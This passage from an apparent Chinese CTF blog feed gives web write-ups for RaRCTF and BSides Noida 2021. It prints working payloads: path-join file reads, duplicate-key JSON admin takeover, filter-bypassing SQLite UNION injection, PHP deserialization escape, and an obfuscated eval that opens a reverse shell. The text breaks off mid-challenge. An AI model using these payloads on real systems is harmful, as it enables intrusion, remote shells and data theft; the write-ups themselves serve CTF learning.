Uploader</h3><blockquote><p>A new secure, safe and smooth uploader!</p></blockquote><p>题目所给出的上传和访问路由的代码如下。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/upload&#x27;</span>, methods=[<span class="string">&#x27;POST&#x27;</span>]</span>)</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">upload</span>():</span></span><br><span class="line">    <span class="keyword">if</span> <span class="string">&#x27;file&#x27;</span> <span class="keyword">not</span> <span class="keyword">in</span> request.files:</span><br><span class="line">        <span class="keyword">return</span> redirect(<span class="string">&#x27;/&#x27;</span>)</span><br><span class="line">    file = request.files[<span class="string">&#x27;file&#x27;</span>]</span><br><span class="line">    <span class="keyword">if</span> <span class="string">&quot;.&quot;</span> <span class="keyword">in</span> file.filename:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;Bad filename!&quot;</span>, <span class="number">403</span></span><br><span class="line">    conn = db()</span><br><span class="line">    cur = conn.cursor()</span><br><span class="line">    uid = uuid.uuid4().<span class="built_in">hex</span></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        cur.execute(<span class="string">&quot;insert into files (id, path) values (?, ?)&quot;</span>, (uid, file.filename,))</span><br><span class="line">    <span class="keyword">except</span> sqlite3.IntegrityError:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;Duplicate file&quot;</span></span><br><span class="line">    conn.commit()</span><br><span class="line">    file.save(<span class="string">&#x27;uploads/&#x27;</span> + file.filename)</span><br><span class="line">    <span class="keyword">return</span> redirect(<span class="string">&#x27;/file/&#x27;</span> + uid)</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/file/&lt;id&gt;&#x27;</span></span>)</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">file</span>(<span class="params"><span class="built_in">id</span></span>):</span></span><br><span class="line">    conn = db()</span><br><span class="line">    cur = conn.cursor()</span><br><span class="line">    cur.execute(<span class="string">&quot;select path from files where id=?&quot;</span>, (<span class="built_in">id</span>,))</span><br><span class="line">    res = cur.fetchone()</span><br><span class="line">    <span class="keyword">if</span> res <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;File not found&quot;</span>, <span class="number">404</span></span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(os.path.join(<span class="string">&quot;uploads/&quot;</span>, res[<span class="number">0</span>]), <span class="string">&quot;r&quot;</span>) <span class="keyword">as</span> f:</span><br><span class="line">        <span class="keyword">return</span> f.read()</span><br></pre></td></tr></table></figure><p>可以发现文件上传之后会生成一个 id，然后访问的时候只通过这个 id 进行文件读取。上传时文件名中不允许有 . 字符，而其他的字符通通没有处理，因此不能目录穿越读文件。再看访问的路由，使用了 <code>os.path.join</code> 来将文件名与路径拼接从而进行读取。在这个方法的文档中有如下一句话。</p><blockquote><p>If a component is an absolute path, all previous components are thrown away and joining continues from the absolute path component.</p></blockquote><p>假设此时的 <code>res[0]</code> 变成了绝对路径，也就是 <code>/flag</code>，那么此前的所有路径就会被抛弃，进而读取到根目录下的 flag。因此构造出如下两个请求来获取 flag。</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/upload</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>193.57.159.27:35294</span><br><span class="line"><span class="attribute">Content-Length</span><span class="punctuation">: </span>282</span><br><span class="line"><span class="attribute">Content-Type</span><span class="punctuation">: </span>multipart/form-data; boundary=----WebKitFormBoundary51X6ZmnbrL0hXAYM</span><br><span class="line"><span class="attribute">Connection</span><span class="punctuation">: </span>close</span><br><span class="line"></span><br><span class="line">------WebKitFormBoundary51X6ZmnbrL0hXAYM</span><br><span class="line"><span class="attribute">Content-Disposition</span><span class="punctuation">: </span>form-data; name=&quot;file&quot;; filename=&quot;/flag&quot;</span><br><span class="line"><span class="attribute">Content-Type</span><span class="punctuation">: </span>image/png</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">------WebKitFormBoundary51X6ZmnbrL0hXAYM</span><br><span class="line"><span class="attribute">Content-Disposition</span><span class="punctuation">: </span>form-data; name=&quot;submit&quot;</span><br><span class="line"></span><br><span class="line">Upload File</span><br><span class="line">------WebKitFormBoundary51X6ZmnbrL0hXAYM--</span><br><span class="line"></span><br></pre></td></tr></table></figure><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">GET</span> <span class="string">/file/d129a262e4724c549cda37a51755e1bf</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>193.57.159.27:35294</span><br><span class="line"><span class="attribute">Connection</span><span class="punctuation">: </span>close</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>在使用第一个请求获得的链接请求访问文件后可获得 flag。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">rarctf&#123;4lw4y5_r34d_th3_d0c5_pr0p3rly!-71ed16&#125;</span><br></pre></td></tr></table></figure><h3 id="Microservices-As-A-Service-3"><a href="#Microservices-As-A-Service-3" class="headerlink" title="Microservices As A Service 3"></a>Microservices As A Service 3</h3><p>manager 中的 update 路由将 JSON 数据由 Python 传递到 Golang 的服务中处理。JSON 的解析 Golang 中使用的模块是 github.com/buger/jsonparser。稍微测一下可以发现当 JSON 键值重复的时候其将选择前者。</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> (</span><br><span class="line"><span class="string">&quot;fmt&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="string">&quot;github.com/buger/jsonparser&quot;</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">str := <span class="string">&quot;&#123;\&quot;key\&quot;: \&quot;value1\&quot;, \&quot;key\&quot;: \&quot;value2\&quot;&#125;&quot;</span></span><br><span class="line">bytes_str := []<span class="keyword">byte</span>(str)</span><br><span class="line">fmt.Println(jsonparser.GetString(bytes_str, <span class="string">&quot;key&quot;</span>))</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>上面的代码的运行结果是 value1 &lt;nil&gt;。而在 Python 中，当 JSON 的键值重复时其将选择后者。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> json</span><br><span class="line">jObject = json.loads(<span class="string">&quot;&#123;\&quot;key\&quot;: \&quot;value1\&quot;, \&quot;key\&quot;: \&quot;value2\&quot;&#125;&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(jObject[<span class="string">&quot;key&quot;</span>])</span><br></pre></td></tr></table></figure><p>上面的代码的运行结果是 value2。因此此时只需要让键值重复即可绕过限制修改 admin 即 id 为 0 的用户的密码。构造出如下的请求来修改 admin 的密码。</p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/manager/update</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>maas.rars.win</span><br><span class="line"><span class="attribute">Connection</span><span class="punctuation">: </span>close</span><br><span class="line"><span class="attribute">Content-Length</span><span class="punctuation">: </span>52</span><br><span class="line"><span class="attribute">Content-Type</span><span class="punctuation">: </span>application/json</span><br><span class="line"><span class="attribute">Cookie</span><span class="punctuation">: </span>session=eyJtYW5hZ2VyaWQiOiIxIiwibWFuYWdlcm5hbWUiOiJMZW1vblByZWZlY3QifQ.YRPO1A.PH8WHzCXnxjEwlMIUQvkfzxyuGc</span><br><span class="line"></span><br><span class="line">&#123;&quot;id&quot;:0,&quot;id&quot;:1,&quot;password&quot;:&quot;this_is_a_long_password&quot;&#125;</span><br></pre></td></tr></table></figure><p>此时使用修改的密码再去登录 admin 账户即可得到 flag。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">rarctf&#123;rfc8259_15_4_b1t_v4gu3_1a97a3d3&#125;</span><br></pre></td></tr></table></figure>]]></content:encoded>
      
      
      
      
      <comments>https://lemonprefect.cn/zh-CN/posts/837b9c99.html#disqus_thread</comments>
      
    </item>
    
    <item>
      <title>BSides Noida CTF 2021</title>
      <link>https://lemonprefect.cn/zh-CN/posts/6b16e944.html</link>
      <guid>https://lemonprefect.cn/zh-CN/posts/6b16e944.html</guid>
      <pubDate>Mon, 09 Aug 2021 07:00:00 GMT</pubDate>
      
        
        
          
          
      <description>&lt;h2 id=&quot;Web&quot;&gt;&lt;a href=&quot;#Web&quot; class=&quot;headerlink&quot; title=&quot;Web&quot;&gt;&lt;/a&gt;Web&lt;/h2&gt;&lt;h3 id=&quot;Baby-Web&quot;&gt;&lt;a href=&quot;#Baby-Web&quot; class=&quot;headerlink&quot; title=&quot;Baby Web&quot;&gt;&lt;/a&gt;Baby Web&lt;/h3&gt;&lt;blockquote&gt;
&lt;p&gt;Just a place to see list of all challs from bsides noida CTF, maybe some flag too xD&lt;br&gt;Note : Bruteforce is not</description>
          
        
      
      
      
      <content:encoded><![CDATA[<h2 id="Web"><a href="#Web" class="headerlink" title="Web"></a>Web</h2><h3 id="Baby-Web"><a href="#Baby-Web" class="headerlink" title="Baby Web"></a>Baby Web</h3><blockquote><p>Just a place to see list of all challs from bsides noida CTF, maybe some flag too xD<br>Note : Bruteforce is not required.</p></blockquote><p>题目给出的是一个 SQLite 注入点，但是 Nginx 禁用了所有字母。根据给出的附件可知根目录下有 <code>karma.db</code>，访问到 <code>/karma.db</code> 将其下载下来。使用 SQLite Expert 读取即可得到 flag。</p><p><img src="https://api.lemonprefect.cn/image/hdslb/archive/824f1fae-1c61-4acb-8561-3e2bcd829477/1628492691729899/778de3c107ceaff1a2882396a0f81a783dd28c4c.png"></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">BSNoida&#123;4_v3ry_w4rm_w31c0m3_2_bs1d35_n01d4&#125;</span><br></pre></td></tr></table></figure><h3 id="Baby-Web-Revenge"><a href="#Baby-Web-Revenge" class="headerlink" title="Baby Web Revenge"></a>Baby Web Revenge</h3><blockquote><p>So close yet so far</p></blockquote><p>再来审视一下 Nginx 的过滤。</p><figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">if($arg_chall_id ~ [A-Za-z_.%])&#123;</span><br><span class="line"><span class="attribute">return</span> <span class="number">500</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这里其实只看了参数 chall_id，但是因为后端是 PHP，所以 chall.id 实际上也会被 PHP 解析成 chall_id。但是到 Nginx 时却不会被这么处理，因此得以绕过 Nginx 的过滤。结合后端是 SQLite，使用如下载荷即可读取信息。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">chall.id&#x3D;1&#x2F;**&#x2F;union&#x2F;**&#x2F;select&#x2F;**&#x2F;group_concat(sql),2,3,4,5,6&#x2F;**&#x2F;from&#x2F;**&#x2F;sqlite_master</span><br></pre></td></tr></table></figure><p>得到如下表结构，进而尝试读取 flag。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">CREATE TABLE CTF(</span><br><span class="line">    id INteger AUTO_INCREMENT,</span><br><span class="line">    title varchar(255) not NULL,</span><br><span class="line">    description varchar(255) not NULL,</span><br><span class="line">    category varchar(255) not NULL,</span><br><span class="line">    author varchar(255) not NULL,</span><br><span class="line">    points int NOT NULL),</span><br><span class="line">CREATE TABLE therealflags(</span><br><span class="line">    id int AUTO_INCREMENT,</span><br><span class="line">    flag varchar(255) not NULL)</span><br></pre></td></tr></table></figure><p>构造出如下载荷读取 flag。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">chall.id&#x3D;1&#x2F;**&#x2F;union&#x2F;**&#x2F;select&#x2F;**&#x2F;flag,2,3,4,5,6&#x2F;**&#x2F;from&#x2F;**&#x2F;therealflags</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">BSNoida&#123;4_v3ry_w4rm_w31c0m3_2_bs1d35_n01d4_fr0m_4n_1nt3nd3d_s01ut10nxD&#125;</span><br></pre></td></tr></table></figure><h3 id="wowooo"><a href="#wowooo" class="headerlink" title="wowooo"></a>wowooo</h3><blockquote><p>it’s really interesting<br>Note : Bruteforce is not required.</p></blockquote><p>根据页面源码注释的提示提交 GET 参数 <code>debug</code> 即可得到如下代码。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">include &#39;flag.php&#39;;</span><br><span class="line">function filter($string)&#123;</span><br><span class="line">    $filter &#x3D; &#39;&#x2F;flag&#x2F;i&#39;;</span><br><span class="line">    return preg_replace($filter,&#39;flagcc&#39;,$string);</span><br><span class="line">&#125;</span><br><span class="line">$username&#x3D;$_GET[&#39;name&#39;];</span><br><span class="line">$pass&#x3D;&quot;V13tN4m_number_one&quot;;</span><br><span class="line">$pass&#x3D;&quot;Fl4g_in_V13tN4m&quot;;</span><br><span class="line">$ser&#x3D;&#39;a:2:&#123;i:0;s:&#39;.strlen($username).&quot;:\&quot;$username\&quot;;i:1;s:&quot;.strlen($pass).&quot;:\&quot;$pass\&quot;;&#125;&quot;;</span><br><span class="line"></span><br><span class="line">$authen &#x3D; unserialize(filter($ser));</span><br><span class="line"></span><br><span class="line">if($authen[1]&#x3D;&#x3D;&#x3D;&quot;V13tN4m_number_one &quot;)&#123;</span><br><span class="line">    echo $flag;</span><br><span class="line">&#125;</span><br><span class="line">if (!isset($_GET[&#39;debug&#39;])) &#123;</span><br><span class="line">    echo(&quot;PLSSS DONT HACK ME!!!!!!&quot;).PHP_EOL;</span><br><span class="line">&#125; else &#123;</span><br><span class="line">    highlight_file( __FILE__);</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br><span class="line">&lt;!-- debug --&gt;</span><br></pre></td></tr></table></figure><p>很明显是少变多的反序列化逃逸，逃逸点在变量 username 处由四个字符变为六个字符。先构造出要逃逸达成的部分。</p><figure class="highlight plain"><figcaption><span>text</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&quot;;i:1;s:19:&quot;V13tN4m_number_one &quot;;&#125;</span><br></pre></td></tr></table></figure><p>一共 34 个字符，因此此时需要替换 17 次才能完成逃逸，构造出如下载荷。</p><figure class="highlight plain"><figcaption><span>text</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflag&quot;;i:1;s:19:&quot;V13tN4m_number_one &quot;;&#125;</span><br></pre></td></tr></table></figure><p>以 GET 参数 name 发起请求即可得到 flag。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">BSNoida&#123;3z_ch4all_46481684185_!!!!!!@!&#125;</span><br></pre></td></tr></table></figure><h3 id="freepoint"><a href="#freepoint" class="headerlink" title="freepoint"></a>freepoint</h3><blockquote><p>i hate php &gt;.&lt;<br>Note : Bruteforce is not required.</p></blockquote><p>题目给出的代码如下。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">include</span> <span class="string">&quot;config.php&quot;</span>;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">filter</span>(<span class="params"><span class="variable">$str</span></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(preg_match(<span class="string">&quot;/system|exec|passthru|shell_exec|pcntl_exec|bin2hex|popen|scandir|hex2bin|[~$.^_`]|\&#x27;[a-z]|\&quot;[a-z0-9]/i&quot;</span>,<span class="variable">$str</span>)) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">BSides</span> </span>&#123;</span><br><span class="line">    <span class="keyword">protected</span> <span class="variable">$option</span>;</span><br><span class="line">    <span class="keyword">protected</span> <span class="variable">$name</span>;</span><br><span class="line">    <span class="keyword">protected</span> <span class="variable">$note</span>;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="variable">$option</span> = <span class="string">&quot;no flag&quot;</span>;</span><br><span class="line">        <span class="variable">$name</span> = <span class="string">&quot;guest&quot;</span>;</span><br><span class="line">        <span class="variable">$note</span> = <span class="string">&quot;flag&#123;flag_phake&#125;&quot;</span>;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;load();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">load</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">$this</span>-&gt;option === <span class="string">&quot;no flag&quot;</span>) &#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&quot;flag here ! :)&quot;</span>);</span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span> (<span class="keyword">$this</span>-&gt;option === <span class="string">&quot;getFlag&quot;</span>)&#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;loadFlag();</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&quot;You don&#x27;t need flag ?&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">private</span> <span class="function"><span class="keyword">function</span> <span class="title">loadFlag</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="keyword">$this</span>-&gt;note) &amp;&amp; <span class="keyword">isset</span>(<span class="keyword">$this</span>-&gt;name)) &#123;</span><br><span class="line">            <span class="keyword">if</span> (<span class="keyword">$this</span>-&gt;name === <span class="string">&quot;admin&quot;</span>) &#123;</span><br><span class="line">                <span class="keyword">if</span> (filter(<span class="keyword">$this</span>-&gt;note) == <span class="number">1</span>) &#123;</span><br><span class="line">                    <span class="keyword">eval</span>(<span class="keyword">$this</span>-&gt;note.<span class="string">&quot;;&quot;</span>);</span><br><span class="line">                &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                    <span class="keyword">die</span>(<span class="string">&quot;18cm30p !! :&lt; &quot;</span>);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;load();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;ctf&#x27;</span>])) &#123;</span><br><span class="line">    <span class="variable">$ctf</span> = (<span class="keyword">string</span>)<span class="variable">$_GET</span>[<span class="string">&#x27;ctf&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span> (check(<span class="variable">$ctf</span>)) &#123;</span><br><span class="line">        unserialize(<span class="variable">$ctf</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>可以发现只需要控制 option 为 getFlag，name 为 admin 即可进入到 note 的执行。由于这里进行了诸多限制，考虑使用十六进制和字符串反向绕过。构造出如下 payload 来读取 PHPINFO。</p><figure class="highlight plain"><figcaption><span>text</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">O:6:&quot;BSides&quot;:3:&#123;s:6:&quot;option&quot;;s:7:&quot;getFlag&quot;;s:4:&quot;name&quot;;s:5:&quot;admin&quot;;s:4:&quot;note&quot;;s:27:&quot;eval(strrev(&quot;;)(ofniphp&quot;));&quot;;&#125;</span><br></pre></td></tr></table></figure><p>可以发现在 disable_function 处没有禁用任何函数，因此直接一把梭反弹 shell。</p><figure class="highlight plain"><figcaption><span>text</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">O:6:&quot;BSides&quot;:3:&#123;s:6:&quot;option&quot;;s:7:&quot;getFlag&quot;;s:4:&quot;name&quot;;s:5:&quot;admin&quot;;s:4:&quot;note&quot;;s:139:&quot;eval(strrev(&quot;;))&#39;221362e3030253532333f2031323e283e2633313e283f2073647f2675646f20262e30296d20286371626220236d20286371626&#39;(nib2xeh(metsys&quot;));&quot;;&#125;</span><br></pre></td></tr></table></figure><p>反弹 shell 在 /home 下读到 fl4g_ne_xxx.txt 即为 flag。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">BSNoida&#123;Fre3_fl4g_f04_y0u_@@55361988!!!&#125;</span><br></pre></td></tr></table></figure><h3 id="Calculate"><a href="#Calculate" class="headerlink" title="Calculate"></a>Calculate</h3><blockquote><p>Are you a math prodigy? hehe</p></blockquote><p>根据页面源码中的提示加上 🐶 为 key 的 GET 参数即可得到相对完整的源码。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;🐶&#x27;</span>])) &#123;</span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">filter</span>(<span class="params"><span class="variable">$payload</span></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (preg_match(<span class="string">&quot;/[a-zA-BD-Z!@#%^&amp;*:&#x27;\&quot;|`~\\\\]|3|5|6|9/&quot;</span>,<span class="variable">$payload</span>)) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">&lt;!-- ?🐶 --&gt;</span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">include</span> <span class="string">&quot;config.php&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;VietNam&#x27;</span>])) &#123;</span><br><span class="line">    <span class="variable">$VN</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;VietNam&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span> (filter(<span class="variable">$VN</span>)) &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;nope!!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (!is_string(<span class="variable">$VN</span>) || strlen(<span class="variable">$VN</span>) &gt; <span class="number">110</span>) &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;18cm30p ??? =)))&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="variable">$VN</span> = <span class="string">&quot;echo &quot;</span>.<span class="variable">$VN</span>.<span class="string">&quot;;&quot;</span>;</span><br><span class="line">        <span class="keyword">eval</span>(<span class="variable">$VN</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;check&#x27;</span>])) &#123;</span><br><span class="line">        <span class="keyword">echo</span> phpinfo();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> &#123;</span><br><span class="line">        highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>此时就相当于构造一个字母和部分数字的限定长度的 shell，先用 check 参数看一眼 disable_functions。发现 chr 函数和 exec 